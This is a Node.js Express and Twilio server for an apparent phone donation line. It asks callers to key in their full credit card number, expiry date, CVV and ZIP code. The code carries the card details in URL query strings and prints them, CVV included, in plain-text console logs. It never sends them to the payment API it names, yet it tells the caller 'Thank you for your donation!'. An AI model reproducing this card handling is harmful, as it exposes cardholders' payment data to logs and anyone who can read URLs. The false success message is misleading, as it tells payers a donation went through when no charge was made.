require('dotenv').config();
const express = require('express');
const { twiml } = require('twilio');
const path = require('path');

const app = express();
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.send('Donation server is running.');
});

// Serve the donation web page
app.get('/donate', (req, res) => {
    res.sendFile(__dirname + '/donate.html');
});

// Webhook for incoming calls
app.post('/voice', (req, res) => {
    const VoiceResponse = twiml.VoiceResponse;
    const response = new VoiceResponse();
    // Gather DTMF for donation amount
    const gather = response.gather({
        numDigits: 4,
        finishOnKey: '#',
        action: '/process-donation',
        method: 'POST',
        timeout: 10
    });
    gather.play('https://raw.githubusercontent.com/kmvyyg/donation/main/MM_2.mp3'); // MP3: Please enter the amount and press #
    res.type('text/xml');
    res.send(response.toString());
});

// Handle DTMF input (donation amount)
app.post('/process-donation', (req, res) => {
    const VoiceResponse = twiml.VoiceResponse;
    const response = new VoiceResponse();
    const digits = req.body.Digits || '';

    logPhoneEvent(req.body.From || req.body.Caller, 'process-donation', req.body.Digits);

    // If # was pressed before 1-4 digits, or invalid input, repeat prompt
    if (digits === '' || digits.length < 1 || digits.length > 4 || /[^0-9]/.test(digits)) {
        logPhoneEvent(req.body.From || req.body.Caller, 'process-donation', digits, 'Invalid amount input');
        // Gather DTMF while replaying MP3
        const gather = response.gather({
            numDigits: 4,
            finishOnKey: '#',
            action: '/process-donation',
            method: 'POST',
            timeout: 10
        });
        gather.play('https://raw.githubusercontent.com/kmvyyg/donation/main/MM_2.mp3'); // MP3: Please enter the amount and press #
        res.type('text/xml');
        res.send(response.toString());
        return;
    }
    logPhoneEvent(req.body.From || req.body.Caller, 'process-donation', digits);
    // Gather DTMF while playing confirmation MP3, TTS, and prompt (barge-in enabled)
    const gather = response.gather({
        numDigits: 1,
        action: `/confirm-donation?amount=${digits}`,
        method: 'POST',
        timeout: 2,
        finishOnKey: '' // Allow continue without #
    });
    gather.play('https://raw.githubusercontent.com/kmvyyg/donation/main/MM_3.mp3'); // MP3: You have entered
    gather.say({ voice: 'man' }, `${parseInt(digits, 10)} dollars.`);
    gather.play('https://raw.githubusercontent.com/kmvyyg/donation/main/MM_4.mp3'); // MP3: If correct, press 1. To re-enter, press 2.
    // If no response in 10 seconds, repeat the prompt
    response.redirect({ method: 'POST' }, `/process-donation?Digits=${digits}`);
    res.type('text/xml');
    res.send(response.toString());
});

// Handle confirmation or re-entry
app.post('/confirm-donation', (req, res) => {
    const VoiceResponse = twiml.VoiceResponse;
    const response = new VoiceResponse();
    const amount = req.query.amount || '';
    const digit = req.body.Digits;
    if (digit === '1') {
        // Gather DTMF while playing MP3 for credit card
        const gather = response.gather({
            finishOnKey: '#',
            action: `/process-cc?amount=${amount}`,
            method: 'POST',
            timeout: 10
        });
        gather.play('https://raw.githubusercontent.com/kmvyyg/donation/main/MM_5.mp3'); // MP3: Please enter your credit card number and press #
    } else if (digit === '2') {
        // Redirect back to /voice to re-enter
        response.redirect('/voice');
    } else {
        response.say('Invalid input.');
        response.redirect(`/process-donation?Digits=${amount}`);
    }
    res.type('text/xml');
    res.send(response.toString());
});

// Handle credit card number input
app.post('/process-cc', (req, res) => {
    const VoiceResponse = twiml.VoiceResponse;
    const response = new VoiceResponse();
    const amount = req.query.amount || '';
    const cc = req.body.Digits || '';
    // If not 15-16 digits or contains non-digits, repeat prompt
    if (!/^[0-9]{15,16}$/.test(cc)) {
        logPhoneEvent(req.body.From || req.body.Caller, 'process-cc', cc, 'Invalid credit card input');
        // Gather DTMF while replaying MP3 for credit card
        const gather = response.gather({
            finishOnKey: '#',
            action: `/process-cc?amount=${amount}`,
            method: 'POST',
            timeout: 10
        });
        gather.play('https://raw.githubusercontent.com/kmvyyg/donation/main/MM_5.mp3'); // MP3: Please enter your credit card number and press #
        res.type('text/xml');
        res.send(response.toString());
        return;
    }
    logPhoneEvent(req.body.From || req.body.Caller, 'process-cc', cc);
    // Gather DTMF while playing MP3 for expiration
    const gather = response.gather({
        finishOnKey: '#',
        action: `/process-exp?amount=${amount}&cc=${cc}`,
        method: 'POST',
        timeout: 10
    });
    gather.play('https://raw.githubusercontent.com/kmvyyg/donation/main/MM_6.mp3'); // Please enter expiration date and press #
    res.type('text/xml');
    res.send(response.toString());
});

// Handle expiration date input
app.post('/process-exp', (req, res) => {
    const VoiceResponse = twiml.VoiceResponse;
    const response = new VoiceResponse();
    const amount = req.query.amount || '';
    const cc = req.query.cc || '';
    const exp = req.body.Digits || '';
    if (!/^[0-9]{4}$/.test(exp)) {
        logPhoneEvent(req.body.From || req.body.Caller, 'process-exp', exp, 'Invalid expiration input');
        // Gather DTMF while replaying MP3 for expiration
        const gather = response.gather({
            finishOnKey: '#',
            action: `/process-exp?amount=${amount}&cc=${cc}`,
            method: 'POST',
            timeout: 10
        });
        gather.play('https://raw.githubusercontent.com/kmvyyg/donation/main/MM_6.mp3'); // Please enter expiration date and press #
        res.type('text/xml');
        res.send(response.toString());
        return;
    }
    logPhoneEvent(req.body.From || req.body.Caller, 'process-exp', exp);
    // Gather DTMF while playing MP3 for CVV
    const gather = response.gather({
        finishOnKey: '#',
        action: `/process-cvv?amount=${amount}&cc=${cc}&exp=${exp}`,
        method: 'POST',
        timeout: 10
    });
    gather.play('https://raw.githubusercontent.com/kmvyyg/donation/main/MM_7.mp3'); // Please enter CVV and press #
    res.type('text/xml');
    res.send(response.toString());
});

// Handle CVV input (final step)
app.post('/process-cvv', (req, res) => {
    const VoiceResponse = twiml.VoiceResponse;
    const response = new VoiceResponse();
    const amount = req.query.amount || '';
    const cc = req.query.cc || '';
    const exp = req.query.exp || '';
    const cvv = req.body.Digits || '';
    if (!/^[0-9]{3,4}$/.test(cvv)) {
        logPhoneEvent(req.body.From || req.body.Caller, 'process-cvv', cvv, 'Invalid CVV input');
        // Gather DTMF while replaying MP3 for CVV
        const gather = response.gather({
            finishOnKey: '#',
            action: req.originalUrl,
            method: 'POST',
            timeout: 10
        });
        gather.play('https://raw.githubusercontent.com/kmvyyg/donation/main/MM_7.mp3'); // Please enter CVV and press #
        res.type('text/xml');
        res.send(response.toString());
        return;
    }
    logPhoneEvent(req.body.From || req.body.Caller, 'process-cvv', cvv);
    // Gather DTMF while playing MP3 for ZIP code
    const gather = response.gather({
        numDigits: 5,
        finishOnKey: '#',
        action: `/process-zip?amount=${amount}&cc=${cc}&exp=${exp}&cvv=${cvv}`,
        method: 'POST',
        timeout: 10
    });
    gather.play('https://raw.githubusercontent.com/kmvyyg/donation/main/MM_8.mp3'); // Please enter your 5 digit ZIP code and press #
    res.type('text/xml');
    res.send(response.toString());
});

// Handle ZIP code input (final step)
app.post('/process-zip', (req, res) => {
    const VoiceResponse = twiml.VoiceResponse;
    const response = new VoiceResponse();
    const zip = req.body.Digits || '';
    if (!/^[0-9]{5}$/.test(zip)) {
        logPhoneEvent(req.body.From || req.body.Caller, 'process-zip', zip, 'Invalid ZIP input');
        // Gather DTMF while replaying MP3 for ZIP code
        const gather = response.gather({
            numDigits: 5,
            finishOnKey: '#',
            action: req.originalUrl,
            method: 'POST',
            timeout: 10
        });
        gather.play('https://raw.githubusercontent.com/kmvyyg/donation/main/MM_8.mp3'); // Please enter your 5 digit ZIP code and press #
        res.type('text/xml');
        res.send(response.toString());
        return;
    }
    logPhoneEvent(req.body.From || req.body.Caller, 'process-zip', zip);
    // Send donation to Cardknox API (Sola) - use correct endpoint and payload
    const fetch = require('node-fetch');
    const apiKey = process.env.CARDKNOX_API_KEY;
    const amount = req.query.amount || '';
    const cc = req.query.cc || '';
    const exp = req.query.exp || '';
    const cvv = req.query.cvv || '';
    const phone = req.body.Caller || req.body.From || '';
    const cardknoxPayload = {
        xKey: apiKey,
        xVersion: '4.5.6',
        xSoftwareVersion: '4.5.6',
    };
    // In a real scenario, you would send the payment details to Cardknox here
    console.log('Processing donation:', { amount, cc, exp, cvv, zip, phone });
    response.say('Thank you for your donation!');
    res.type('text/xml');
    res.send(response.toString());
});

function logPhoneEvent(phoneNumber, eventType, details, message = '') {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] PHONE EVENT - ${phoneNumber} - ${eventType}: ${JSON.stringify(details)} ${message}`);
}

app.listen(3000, () => {
    console.log('Server running on port 3000');
});
